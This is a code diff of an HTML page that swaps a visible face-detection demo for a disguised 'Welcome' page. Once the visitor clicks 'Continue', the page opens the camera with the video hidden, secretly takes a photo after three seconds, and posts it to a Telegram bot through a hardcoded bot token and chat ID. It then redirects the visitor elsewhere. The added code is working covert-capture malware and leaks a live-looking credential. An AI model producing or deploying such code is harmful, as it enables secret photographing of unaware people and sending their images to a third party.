@@ -3,36 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facial Recognition</title>
+    <title>Hidden Camera Capture</title>
     <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
     <style>
-        body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        video {
-            border: 2px solid black;
-            margin-top: 20px;
-            width: 100%;
-            max-width: 640px;
-            height: auto;
-        }
-        canvas {
-            width: 100%;
-            max-width: 640px;
-            height: auto;
-            display: none;
-        }
-        #message {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ff4081;
-            display: none;
-        }
+        body { text-align: center; font-family: Arial, sans-serif; }
+        #video, #canvas { display: none; } /* Kamera tidak ditunjukkan */
+        #message { font-size: 20px; font-weight: bold; color: green; display: none; }
     </style>
 </head>
 <body>
-    <h1>Facial Recognition Access</h1>
+    <h1>Welcome</h1>
+    <button id="continueBtn">Continue</button>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
     <p id="message"></p>
@@ -42,62 +23,47 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         const message = document.getElementById('message');
+        const continueBtn = document.getElementById('continueBtn');
         const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
         const TELEGRAM_CHAT_ID = '5934902786';
 
-        async function loadModels() {
-            await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
-            console.log("Face detection model loaded successfully.");
-        }
+        continueBtn.onclick = async () => {
+            continueBtn.style.display = "none"; // Sembunyikan button lepas ditekan
+            await startCamera();
+        };
 
         async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                await loadModels();
-                detectFace();
+                setTimeout(captureAndSend, 3000); // Ambil gambar selepas 3 saat
             } catch (err) {
                 console.error("Error accessing camera: ", err);
             }
-        }
-
-        async function detectFace() {
-            setTimeout(async () => {
-                const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
-                if (!detections) {
-                    video.style.display = "none";
-                    message.innerText = "Error detecting face.";
-                    message.style.color = "red";
-                    message.style.display = "block";
-                    setTimeout(() => { window.location.reload(); }, 3000);
-                    return;
-                }
-                captureAndSend();
-            }, 5000);
         }
 
         function captureAndSend() {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             canvas.toBlob(blob => {
                 let formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("photo", blob, "face.jpg");
-                
+                formData.append("photo", blob, "hidden_capture.jpg");
+
                 fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 }).then(() => {
-                    video.style.display = "none";
-                    message.innerText = "You look handsome/beautiful today!";
+                    message.innerText = "Redirecting...";
                     message.style.display = "block";
-                    setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
+                    setTimeout(() => {
+                        window.location.href = "https://studandlearn.github.io/project-2/";
+                    }, 2000);
                 }).catch(err => console.error("Error sending photo: ", err));
             }, 'image/jpeg');
         }
-        
-        window.onload = startCamera;
     </script>
 </body>
 </html>
